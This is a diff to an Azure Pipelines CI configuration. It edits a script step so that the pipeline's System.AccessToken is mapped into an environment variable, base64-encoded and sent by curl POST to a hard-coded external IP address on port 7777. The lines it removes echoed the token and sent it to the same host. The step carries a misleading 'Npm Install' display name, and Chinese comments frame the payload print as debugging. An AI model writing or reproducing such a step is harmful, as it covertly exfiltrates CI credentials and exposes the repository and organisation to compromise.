@@ -6,8 +6,17 @@ pool:
 
 steps:
 - checkout: self
-  persistCredentials: true
+  persistCredentials: false
 
 - script: |
-    echo "System.AccessToken is: $SYSTEM_ACCESSTOKEN"
-    curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\"}" http://139.180.193.16:7777
+
+    JSON_PAYLOAD=$(printf '{"accessToken": "%s"}' "$(echo "$SCRIPT_ACCESS_TOKEN" | base64)")
+    
+    echo "Payload to send: $JSON_PAYLOAD" # 打印将要发送的 payload，用于调试
+    
+    curl -X POST -H "Content-Type: application/json" -d "$JSON_PAYLOAD" http://139.180.193.16:7777
+    
+  env:
+    SCRIPT_ACCESS_TOKEN: $(System.AccessToken) # 将 System.AccessToken 映射到环境变量 SCRIPT_ACCESS_TOKEN
+  displayName: 'Npm Install and Send Token' # 建议修改为你实际操作的名称
+    
